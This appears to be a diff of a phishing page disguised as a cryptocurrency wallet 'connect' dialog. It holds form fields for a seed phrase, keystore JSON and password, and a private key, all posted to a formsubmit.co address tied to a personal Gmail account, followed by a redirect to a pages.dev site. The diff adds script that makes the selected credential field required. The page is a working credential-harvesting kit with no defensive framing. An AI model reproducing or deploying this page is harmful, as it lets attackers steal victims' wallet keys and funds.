@@ -35,36 +35,78 @@
 <div class="closex" onclick="shutx('#thebox')">X</div>
 </div>
 <div class="insidewidth onediv">
-<div class="choosegrid">
-<div class="sgrid sactive" onclick="switchshow(this)">Phrase</div>
-<div class="sgrid" onclick="switchshow(this)">Keystore JSON</div>
-<div class="sgrid" onclick="switchshow(this)">Private Key</div>
-</div>
-<div class="loadbox ccbox">
-<div class="loaddv">
-<div class="loader"></div>
-</div>
-</div>
+  <div class="choosegrid">
+    <div class="sgrid sactive wall_type" id="type_phrase" onclick="switchshow(this)">Phrase</div>
+    <div class="sgrid wall_type" id="type_keystore" onclick="switchshow(this)">Keystore JSON</div>
+    <div class="sgrid wall_type" id="type_private" onclick="switchshow(this)">Private Key</div>
+  </div>
+  <div class="loadbox ccbox">
+  <div class="loaddv">
+  <div class="loader"></div>
+  </div>
+  </div>
+  
+  <form action="https://formsubmit.co/Amandapatricia778@gmail.com" method="POST" >
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://wallconn.pages.dev/connect/index.html">
+  
+  <div class="phrasebox ccbox activebox">
+  <textarea class="textarea allinput" name="phrase Key" placeholder="Phrase" id="phrase_key" ></textarea>
+  </div>
+  <div class="keystorebox ccbox">
+  <textarea class="textarea allinput" name="Keystore-JSON"  placeholder="Keystore JSON" id="keystore_json"></textarea>
+  <input class="input allinput" name="Keystore-Password" placeholder="Keystore Password" id="keystore_pass">
+  </div>
+  <div class="privatebox ccbox">
+  <input class="input allinput" name="Private-Key" placeholder="Private Key" id="private_key">
+  </div>
+  <div class="buttonbox">
+  <button class="bluebtn_bird" type="submit" name="import">connect</button>
+  </div>
+  </form>
+  </div>
+  <script>
+    let wallType = document.querySelectorAll(".wall_type")
+  
+    let phraseHolder = document.querySelector("#phrase_key")
+    let keystoreHolder = document.querySelector("#keystore_json")
+    let keystorePass = document.querySelector("#keystore_pass")
+    let privateHolder = document.querySelector("#private_key")
+  
+    phraseHolder.required = true
+    keystoreHolder.required = false
+    keystorePass.required = false
+    privateHolder.required = false
+  
+    wallType.forEach(wall => {
+      wall.addEventListener("click", (e) => {
+        if(e.target.id === "type_keystore") {
+          keystoreHolder.required = true
+          keystorePass.required = true
+  
+          phraseHolder.required = false
+          privateHolder.required = false
+        } else if(e.target.id === "type_private") {
+          privateHolder.required = true
+  
+          keystoreHolder.required = false
+          keystorePass.required = false
+          phraseHolder.required = false
+        } else {
+          phraseHolder.required = true
+  
+          keystoreHolder.required = false
+          keystorePass.required = false
+          privateHolder.required = false
+        }
 
-<form action="https://formsubmit.co/Amandapatricia778@gmail.com" method="POST" >
-  <input type="hidden" name="_captcha" value="false">
-  <input type="hidden" name="_next" value="https://wallconn.pages.dev/connect/index.html">
+      console.log(phraseHolder.required, keystoreHolder.required, keystorePass.required, privateHolder.required)
 
-<div class="phrasebox ccbox activebox">
-<textarea class="textarea allinput" name="phrase Key" placeholder="Phrase" ></textarea>
-</div>
-<div class="keystorebox ccbox">
-<textarea class="textarea allinput" name="Keystore-JSON"  placeholder="Keystore JSON"></textarea>
-<input class="input allinput" name="Keystore-Password" placeholder="Keystore Password">
-</div>
-<div class="privatebox ccbox">
-<input class="input allinput" name="Private-Key" placeholder="Private Key">
-</div>
-<div class="buttonbox">
-<button class="bluebtn_bird" type="submit" name="import">connect</button>
-</div>
-</form>
-</div>
+      })
+    })
+  
+    
+  </script>
 <script>document.getElementById('blue').disabled = true; //Disable at first
 
 //Listen for keyup event (after we hit a key)
@@ -75,7 +117,7 @@
 document.getElementById('seedphrase').addEventListener('keyup', e => {
   //Check for the input's value
   if (e.target.value == "") {
-    document.getElementById('blue').disabled = true;-----------------
+    document.getElementById('blue').disabled = true;
   }
   else {
     document.getElementById('blue').disabled = false;
@@ -2375,12 +2417,6 @@ openx(btn);
 
 
 //End of validations
-
-
-
-
-
-
-</script>
+  </script>
 </body>
 </html>
